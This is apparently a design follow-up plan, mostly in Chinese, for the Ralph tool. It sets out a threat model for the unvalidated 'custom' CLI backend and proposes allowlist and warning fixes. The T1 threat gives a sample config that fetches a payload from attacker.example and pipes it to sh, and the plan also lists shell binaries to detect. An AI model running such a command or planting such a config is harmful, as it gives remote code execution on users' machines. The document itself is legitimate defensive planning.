# Plan 2026-07-15-001: CliBackend Custom Security Followup

## Background

Plan 2026-07-14-001(U7 在 U7-U8 recovery 范围内)物理删除了 5 个 backend(`amp` / `roo` / `kiro` / `kiro-acp` / `copilot`),将保留列表收敛到 7 个:`claude` / `gemini` / `codex` / `opencode` / `pi` / `traecli` / `custom`。U7 计划的设计选择是把 `custom` 留下作为"用户自描述 binary 路径"的逃生口,而不引入新的 backend;但 `custom` 的代码路径**没有任何命令白名单或路径合法性检查**。

导致保留的 `custom` 路径存在一个未在 U7 中处理的威胁:**Ralph 的 `custom` 后端将任意 binary 路径作为 agent 子进程启动并把 prompt 注入 stdin/argv**——即 `custom` 不像 6 个 builtin backend 那样被限制为已知的 binary 名(`claude` / `gemini` / `codex` / `opencode` / `pi` / `traecli`),它接受 `cli.command` 中的**任意字符串**,包括 shell(`/bin/sh`、`bash`、`zsh`)或用户空间任意可执行二进制(`python3`、`curl`、`nc`、`/tmp/attack.sh` 等)。

**当前 `custom` 代码现状**:
- `crates/ralph-adapters/src/cli_backend.rs:72-101`(`from_config`)在 `match config.backend.as_str()` 中将 `"custom" => return Self::custom(config)` 分支直接走 `custom()` 工厂,不做 `cli.command` 内容验证。
- `crates/ralph-adapters/src/cli_backend.rs:673-689`(`custom()`)读取 `config.command.clone()` 作为 `CliBackend::command`,不做路径/名字规范——直接透传给 `build_command()` → `build_command_pty()` → `CliExecutor`/`PtyExecutor`,后者走 `tokio::process::Command::new(&self.command)`。
- **任务注明的引用 `crates/ralph-adapters/src/cli_backend.rs:445` 当前内容是 `gemini_interactive()` 的 doc 注释与函数体(`**Critical quirk**: Gemini requires -i flag ...` + `fn gemini_interactive()`),不是 `custom` 相关代码。该行号已随 baseline `21644a69` 漂移。**修正后的 `custom` 真实行号锚点应改为 `cli_backend.rs:72-101`(配置进入点)+ `cli_backend.rs:673-689`(`custom()` 工厂),下面 Threat 与 Proposed Fix 引用以这两个修正锚点为准**。
- `crates/ralph-cli/src/init.rs:101`(`init_from_backend`)做的是 **backend 名**(`VALID_BACKENDS.contains(&backend)`)校验——即 `"custom"` 这个字符串必须命中白名单,白名单已包含 `"custom"`,所以 `ralph init --backend custom` 会通过。但这**只**校验了 `backend` 字段,没有对 `cli.command` 字段做任何进一步检查。
- `crates/ralph-cli/src/init.rs:137`(`init_from_preset` 的 `backend_override` 校验)同样**只**校验 `backend_override` 字段值是否在 `VALID_BACKENDS` 内——同上,**不**触及 `cli.command`。
- `crates/ralph-cli/src/backend_support.rs:69-71`(`is_known_backend`)和 `VALID_BACKENDS = &["claude", ..., "custom"]` 是**唯一**的"已知 backend" 自描述锚点;`VALID_BACKENDS` 包含 `"custom"`,因此 `custom` 永远会通过这个 check。

**为何这个威胁在 U7 中没处理**:U7 的目标是**用户硬要求删除 5 个 backend**,只触达 backend 一级(字符串清单、`auto_detect`、`wave.rs` 矩阵、preset/fixture/文档),不曾触达 `custom` 工厂内部的 command 校验。U7 计划明确将"删除 5 个 backend"作为唯一目标,留下 `custom` 的安全性为后续 followup。

本计划是 U7 的最小后续 followup,目标是把 `custom` 路径的安全威胁登记在案,并对**修复建议**给出具体方案,作为未来 PR 的输入。**当前 patch 不修改 `cli_backend.rs` / `init.rs`**——只登记威胁模型并建议修复方向。

## Threat

### T1. 任意 binary 被 spawn(RCE)

`custom` 命令从 `ralph.yml` 的 `cli.command` 读取一个**无校验**的字符串,直接作为 `tokio::process::Command::new(&self.command)` 的 argv[0]。如果用户的 `ralph.yml` 或被植入/被替换的 `ralph.yml` 含有类似:

```yaml
cli:
  backend: custom
  command: "/bin/sh"
  args: ["-c", "curl http://attacker.example/payload | sh"]
```

Ralph 在执行 agent 时直接 spawn `/bin/sh -c <...>`,等效于把 prompt 上下文与 agent 输出管道接到一个完全任意外部程序。这是**以 Ralph 进程身份、用户权限、Ralph 的 stdout/stderr/agent 事件流**执行的命令。

### T2. prompt 透传 + shell metacharacter

即使 `custom.command` 是看似安全的 binary(如 `my-agent`),但若用户在 args 里允许富文本(`prompt_mode: arg`),prompt(可能含用户构造的恶意内容)会作为 argv 传入。这是**已知的 prompt-mode 设计**:Ralph 不应假设 binary 自身安全,但 binary 名字白名单可以减少风险面。

### T3. path-traversal 与相对路径

`custom.command` 接受 `"./local-binary"`、`"../sibling/sneaky"`、`"somedir/../../etc/bad"` 这类**相对**路径——`tokio::process::Command` 解析时按 `PATH` 查找时优先级模糊(取决于 `PathExt` 行为)。`./local-binary` 配合错误的工作目录选择,可能在多 agent 调度场景里被错误解析。绝对路径(`/tmp/x`、`/etc/passwd + chmod` 链)更危险。

### T4. `cmdline` 注入(已被 rust 防止,但配置侧仍可能误传 shell)

Rust 的 `Command::new` **不会**通过 `sh -c` 处理,所以注入 `;` / `&&` 在 `cli.command` 中**不会**执行多命令——但 TaskStop(后代进程)与 `std::process::Command` 的 argv 模式**允许** binary 自己解析 `;`,因此 shell-style binary(`sh`/`bash`/`zsh`/`fish`)作为 `cli.command` **会**重新引入 shell 解释语义。

### T5. multi-hat 隔离下的信任放大

isolated execution_mode 下,每个 hat activation 都是独立 agent 进程(per `crates/ralph-core/data/ralph-tools.md` §6)。若某些 preset 隐式把 `cli.command` 委托给 hat 输入解析(例如 hat 通过 `ralph emit --custom-command` 之类),则攻击面扩大到**所有 hat 的输入**。

### 当前不修的现实影响

按"backwards compatibility doesn't matter — it adds clutter for no reason" 与 "Let Ralph Ralph" 的 Ralph 原则,以及 `custom` 后端的 docstring 中未声明"安全边界",当前 `custom` 路径是**按设计接受任意 binary 的逃生口**。但 U7 之后,**这是保留列表中唯一无 builtin 形态的 backend**,值得在修复计划中明确处理。本 plan 是 followup 设计文档,**不**带入紧急热修。

## Proposed Fix

### F1. 软策略(默认不破坏):在 `cli.command` 处加 `is_known_binary` 软警告,不当 hard error

- 在 `CliBackend::custom(config: &CliConfig)` 工厂里增加 `is_likely_shell(command: &str) -> bool`:`["sh", "bash", "zsh", "fish", "dash", "ksh", "csh", "tcsh"]` 命中即返回 `true`,并 `tracing::warn!` 输出一行说明("custom backend is using a shell; this composes Ralph's agent output with shell semantics")。
- 在 `CliBackend::build_command*` 路径不变,仅事件层告警。
- 优点:不破坏现有 `custom --command sh` 用户;给出可观测信号。
- 缺点:不阻断,只是"建议不要这样做"。

### F2. 硬策略:在 `is_known_backend` 增加 `custom_allowlist`

- 引入 `pub const CUSTOM_BINARY_ALLOWLIST: &[&str]`(`backend_support.rs`)作为 `custom` backend 在 `cli.command` 上的默认 allowlist,缺省为 **空**(即拒绝任何 binary)。
- 加 `pub fn resolve_custom_command(command: &str) -> Result<String, CustomBackendError>`,行为:
  - 若 `command` 在 `CUSTOM_BINARY_ALLOWLIST` → 接受;
  - 若 `command` 是绝对路径(`/abs/path/binary`)→ 检查文件存在 + 不在 `/dev`/`/proc`/`/sys` 且可执行(`is_file()` + `permissions().mode() & 0o111 != 0`)+ 不是 sh 类(`is_likely_shell()` 失败)→ 接受;
  - 若 `command` 是相对路径→ 拒绝(走 `./` 或 `../`);
  - 否则拒绝。
- F2 是**严格**模式。`feature_flag custom.command.allowlist_strict = true` 时启用;默认 `false`,保留原行为。
- 优点:可显式启用;不破坏现有 `custom` 默认行为。
- 缺点:实现 + 测试 + 文档同步成本高;`sh`/`bash` 是用户实际场景中常见但出于安全考虑不被允许。

### F3. 用户可配置 allowlist(env 变量)

- 新增 `RALPH_CUSTOM_COMMAND_ALLOWLIST` 环境变量(逗号分隔),运行时覆盖 `CUSTOM_BINARY_ALLOWLIST` 默认值。
- 已有 `feature_flag` 走相同 env-snapshot 读取。
- 优点:用户无需改 preset 即可打开/收紧 allowlist。
- 缺点:增加了一档配置 surface。

### 推荐实现路径(本 plan 不实现,只登记)

1. **F1 软警告**:作为最小改动,放进未来 1 个 PR(`Cargo.toml` 不变,只 touch `cli_backend.rs::custom()` 与一处 `tracing::warn!`)。
2. **F3 env 变量 + F2 hard mode** 合并为下一个独立 PR,触达 `backend_support.rs`(`is_known_backend` 旁增加 `is_known_custom_command`)+ `cli_backend.rs`(`custom()` 工厂增加校验)+ `init.rs:101, 137`(`init_from_backend` / `init_from_preset` 的 `cli.command` 校验,与 `VALID_BACKENDS` 解耦)+ 测试。
3. **重构**:若 `custom` 后端值得长期保留,后续可拆出 `custom_backend.rs` 模块(类似 `copilot_stream.rs` 拆出时已验证的模式),把安全校验与 binary 选择拆到独立文件,降低 `cli_backend.rs` 单文件复杂度(已 2012 行)。

### 本 plan 的交付

- 本文件是**纯文档 followup**,登记 T1-T5 威胁与 F1-F3 修复方向供未来 PR 消费。
- 不修改源码、不发 Ralph 事件、不跑 `cargo build` / `cargo nextest`、`git diff --check` 必通过。
- patch 仅含 `docs/plans/2026-07-15-001-clibackend-custom-security-followup.md` 增量。

## Out of Scope

- **不修改 `cli_backend.rs`** — 不触动 `from_config`(`cli_backend.rs:72-101`)、`custom()`(`cli_backend.rs:673-689`)、`build_command*`(L724/L747+)。当前 patch 是**纯文档登记**,所有安全相关代码改动应进入独立 PR 并带测试。
- **不修改 `init.rs`** — `init_from_backend`(`init.rs:99-113`)与 `init_from_preset`(`init.rs:124-149`)的 `VALID_BACKENDS` 校验保持不变。
- **不修改 `backend_support.rs`** — `VALID_BACKENDS`(L4-8)与 `is_known_backend`(L69-71)与 `VALID_BACKENDS_LABEL`(L9)保持不变。
- **不实现 F1/F2/F3 任何一项** — 本 plan 是设计文档,不是实现计划。
- **不替换 `custom` 为 builtin 形态** — U7 用户硬要求保留 `custom` 作为逃生口,本 plan 不挑战该决策。
- **不修改 `auto_detect.rs` / `preset_lint/` / BDD scenarios / `presets/en/*.yml`** — U7 已收敛完成,本 plan 不引入新 preset 拓扑变更。
- **不实施 `feature_flag custom.command.allowlist_strict`** — 需独立 PR 与 schema parity 检查。
- **不引入 `RALPH_CUSTOM_COMMAND_ALLOWLIST` env 变量** — 同上,需独立 PR。
- **不重构 `cli_backend.rs`** — 即使 2012 行已经偏大,本 plan 不触碰。
- **不跑 `cargo build` / `cargo nextest`** — 当前基线 `21644a69` 已通过(由 2026-07-14-001 recovery commit `21644a69` 验证),本 plan 不再二次验证。

## Reference Verification(任务要求的"先确认当前行附近代码仍匹配"步骤)

执行于隔离 worktree(`fix/u7-clibackend-custom-security-followup`,HEAD = `21644a69`):

| 任务声明锚点 | 当前实际锚点 | 判定 | 备注 |
|---|---|---|---|
| `crates/ralph-adapters/src/cli_backend.rs:445` | `pub fn gemini_interactive() -> Self {` | **行号已漂移**,内容已非 `custom` 相关 | `custom()` 真实行号是 `cli_backend.rs:673-689`(`from_config` 在 L72-101);本 plan 同时引用这两组真实锚点 |
| `crates/ralph-adapters/src/cli_backend/init.rs:101,137` | 文件不存在(`init.rs` 仅存在于 `crates/ralph-cli/src/init.rs`) | **文件路径错误** | `crates/ralph-cli/src/init.rs:101,137` 才是正确路径,内容是 `init_from_backend` 与 `init_from_preset` 的 `VALID_BACKENDS` 校验,**只**校验 backend 名,不校验 `cli.command` |
| 基线 `21644a69` | `21644a69 fix(recovery): 修复 plan 2026-07-14-001 后 fmt baseline 与 cli-doc-drift` | ✓ 匹配 | HEAD 在新 worktree 为 `21644a69` |
